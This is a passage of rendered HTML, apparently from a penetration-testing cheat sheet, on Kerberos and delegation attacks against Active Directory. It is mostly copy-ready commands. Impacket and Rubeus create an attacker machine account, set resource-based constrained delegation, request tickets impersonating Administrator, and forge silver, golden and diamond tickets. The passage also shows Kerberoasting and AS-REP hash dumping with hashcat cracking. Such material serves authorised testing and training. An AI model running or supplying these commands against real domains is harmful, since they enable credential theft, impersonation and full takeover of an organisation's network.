class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<hr />
+<h2 id="resource-based-constrained-delegation">Resource Based Constrained Delegation</h2>
+<p>Resource-Based Constrained Delegation, or RBCD, is configured on the target resource.</p>
+<p>Instead of the service account listing where it can delegate, the target computer has an attribute that defines which principals can act on its behalf.</p>
+<p>The key attribute is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>msDS-AllowedToActOnBehalfOfOtherIdentity
+</span></code></pre></div>
+<p>Common RBCD idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>Controlled principal A
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>  -&gt; is allowed to act on behalf of users to target computer B
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>  -&gt; request S4U ticket as privileged user to service on B
+</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#__codelineno-107-4"></a>  -&gt; use service ticket with Pass-the-Ticket
+</span></code></pre></div>
+<p>Requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Controlled account</td>
+<td>User or computer account used for S4U.</td>
+</tr>
+<tr>
+<td>RBCD write path</td>
+<td>Ability to set or abuse target's RBCD attribute.</td>
+</tr>
+<tr>
+<td>Target computer</td>
+<td>Resource where access is wanted.</td>
+</tr>
+<tr>
+<td>Machine account quota or created machine</td>
+<td>Often used in labs if user can create computers.</td>
+</tr>
+<tr>
+<td>S4U tooling</td>
+<td>Impacket or Rubeus.</td>
+</tr>
+</tbody>
+</table>
+<p>Find existing RBCD:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>msDS-AllowedToActOnBehalfOfOtherIdentity
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a><span class="nb">Get-DomainObject</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span>
+</span></code></pre></div>
+<p>Check MachineAccountQuota:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>maq
+</span></code></pre></div>
+<p>LDAP:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=domainDNS)&quot;</span><span class="w"> </span>ms-DS-MachineAccountQuota
+</span></code></pre></div>
+<p>Create machine account with Impacket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>addcomputer.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;ATTACKBOX$&#39;</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">&#39;MachinePass123!&#39;</span>
+</span></code></pre></div>
+<p>Set RBCD with <code>rbcd.py</code> when you have rights to modify the target computer object:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">&#39;ATTACKBOX$&#39;</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">&#39;TARGET$&#39;</span><span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Read RBCD:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>rbcd.py<span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">&#39;TARGET$&#39;</span><span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Get service ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/target.corp.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="s1">&#39;ATTACKBOX$&#39;</span>:<span class="s1">&#39;MachinePass123!&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Use ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#__codelineno-116-2"></a>klist
+</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#__codelineno-116-3"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@target.corp.local
+</span></code></pre></div>
+<p>Rubeus S4U with controlled computer hash:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">ATTACKBOX</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">MACHINE_NT_HASH</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">target</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>RBCD with PowerView-style object control usually involves setting <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> with a security descriptor. Exact commands vary by tooling and lab.</p>
+<hr />
+<h2 id="kerberos-checklist">Kerberos Checklist</h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Basic context</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>Domain:
+</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>Realm:
+</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a>NetBIOS:
+</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a>DC:
+</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#__codelineno-118-5"></a>Domain SID:
+</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#__codelineno-118-6"></a>Current user:
+</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7" href="#__codelineno-118-7"></a>Current access:
+</span><span id="__span-118-8"><a id="__codelineno-118-8" name="__codelineno-118-8" href="#__codelineno-118-8"></a>Time synced:
+</span></code></pre></div>
+<p>Check time:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>date
+</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a>ntpdate<span class="w"> </span>-q<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Kerberoasting</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>GetUserSPNs.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoast_hashes.txt
+</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoast_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>SPN users:
+</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a>Hashes:
+</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#__codelineno-121-3"></a>Cracked:
+</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#__codelineno-121-4"></a>Service account access:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>ASREP roasting</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-no-pass<span class="w"> </span>-outputfile<span class="w"> </span>asrep_hashes.txt
+</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep_hashes.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>No-preauth users:
+</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#__codelineno-123-2"></a>Hashes:
+</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#__codelineno-123-3"></a>Cracked:
+</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#__codelineno-123-4"></a>Validated access:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Pass the Ticket</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/ticket.ccache
+</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2" href="#__codelineno-124-2"></a>klist
+</span><span id="__span-124-3"><a id="__codelineno-124-3" name="__codelineno-124-3" href="#__codelineno-124-3"></a>wmiexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Windows:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
+</span><span id="__span-125-2"><a id="__codelineno-125-2" name="__codelineno-125-2" href="#__codelineno-125-2"></a><span class="n">klist</span>
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a>Ticket type:
+</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a>Format:
+</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a>User:
+</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a>Service:
+</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a>Access:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Overpass the Hash</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
+</span></code></pre></div>
+<p>Windows:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">alice</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">NT_HASH</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc01</span><span class="p">.</span><span class="n">corp</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>Hash/key:
+</span><span id="__span-129-2"><a id="__codelineno-129-2" name="__codelineno-129-2" href="#__codelineno-129-2"></a>TGT:
+</span><span id="__span-129-3"><a id="__codelineno-129-3" name="__codelineno-129-3" href="#__codelineno-129-3"></a>Injected:
+</span><span id="__span-129-4"><a id="__codelineno-129-4" name="__codelineno-129-4" href="#__codelineno-129-4"></a>Validated:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Silver Ticket</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>SERVICE_NT_HASH<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET</span><span class="w"> </span>Administrator
+</span><span id="__span-130-2"><a id="__codelineno-130-2" name="__codelineno-130-2" href="#__codelineno-130-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>Service hash:
+</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2" href="#__codelineno-131-2"></a>SPN:
+</span><span id="__span-131-3"><a id="__codelineno-131-3" name="__codelineno-131-3" href="#__codelineno-131-3"></a>Forged user:
+</span><span id="__span-131-4"><a id="__codelineno-131-4" name="__codelineno-131-4" href="#__codelineno-131-4"></a>Validated service:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Golden Ticket</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>KRBTGT_NT_HASH<span class="w"> </span>-domain-sid<span class="w"> </span><span class="nv">$DOMAIN_SID</span><span class="w"> </span>-domain<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>Administrator
+</span><span id="__span-132-2"><a id="__codelineno-132-2" name="__codelineno-132-2" href="#__codelineno-132-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>krbtgt key:
+</span><span id="__span-133-2"><a id="__codelineno-133-2" name="__codelineno-133-2" href="#__codelineno-133-2"></a>Domain SID:
+</span><span id="__span-133-3"><a id="__codelineno-133-3" name="__codelineno-133-3" href="#__codelineno-133-3"></a>Forged user:
+</span><span id="__span-133-4"><a id="__codelineno-133-4" name="__codelineno-133-4" href="#__codelineno-133-4"></a>Groups:
+</span><span id="__span-133-5"><a id="__codelineno-133-5" name="__codelineno-133-5" href="#__codelineno-133-5"></a>Validated access:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Diamond Ticket</strong></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">KRBTGT_AES256_KEY</span> <span class="p">/</span><span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">500</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">512</span> <span class="p">/</span><span class="n">ptt</span>
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>Base TGT:
+</span><span id="__span-135-2"><a id="__codelineno-135-2" name="__codelineno-135-2" href="#__codelineno-135-2"></a>krbtgt key:
+</span><span id="__span-135-3"><a id="__codelineno-135-3" name="__codelineno-135-3" href="#__codelineno-135-3"></a>Ticket user:
+</span><span id="__span-135-4"><a id="__codelineno-135-4" name="__codelineno-135-4" href="#__codelineno-135-4"></a>Groups:
+</span><span id="__span-135-5"><a id="__codelineno-135-5" name="__codelineno-135-5" href="#__codelineno-135-5"></a>Validated:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>S4U / Constrained Delegation</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/target.corp.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/svc_web:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a>Controlled account:
+</span><span id="__span-137-2"><a id="__codelineno-137-2" name="__codelineno-137-2" href="#__codelineno-137-2"></a>AllowedToDelegateTo:
+</span><span id="__span-137-3"><a id="__codelineno-137-3" name="__codelineno-137-3" href="#__codelineno-137-3"></a>Impersonated user:
+</span><span id="__span-137-4"><a id="__codelineno-137-4" name="__codelineno-137-4" href="#__codelineno-137-4"></a>Target SPN:
+</span><span id="__span-137-5"><a id="__codelineno-137-5" name="__codelineno-137-5" href="#__codelineno-137-5"></a>Ticket:
+</span><span id="__span-137-6"><a id="__codelineno-137-6" name="__codelineno-137-6" href="#__codelineno-137-6"></a>Validated:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Delegation enumeration</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--find-delegation
+</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--trusted-for-delegation
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a>Unconstrained:
+</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a>Constrained:
+</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3" href="#__codelineno-139-3"></a>RBCD:
+</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4" href="#__codelineno-139-4"></a>Sensitive users:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>RBCD</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a>addcomputer.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;ATTACKBOX$&#39;</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">&#39;MachinePass123!&#39;</span>
+</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2" href="#__codelineno-140-2"></a>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s1">&#39;ATTACKBOX$&#39;</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s1">&#39;TARGET$&#39;</span><span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3" href="#__codelineno-140-3"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/target.corp.local<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="s1">&#39;ATTACKBOX$&#39;</span>:<span class="s1">&#39;MachinePass123!&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a>Target:
+</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a>Controlled computer:
+</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3" href="#__codelineno-141-3"></a>RBCD write:
+</span><span id="__span-141-4"><a id="__codelineno-141-4" name="__codelineno-141-4" href="#__codelineno-141-4"></a>Ticket:
+</span><span id="__span-141-5"><a id="__codelineno-141-5" name="__codelineno-141-5" href="#__codelineno-141-5"></a>Validated:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Common Kerberos errors</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Possible meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
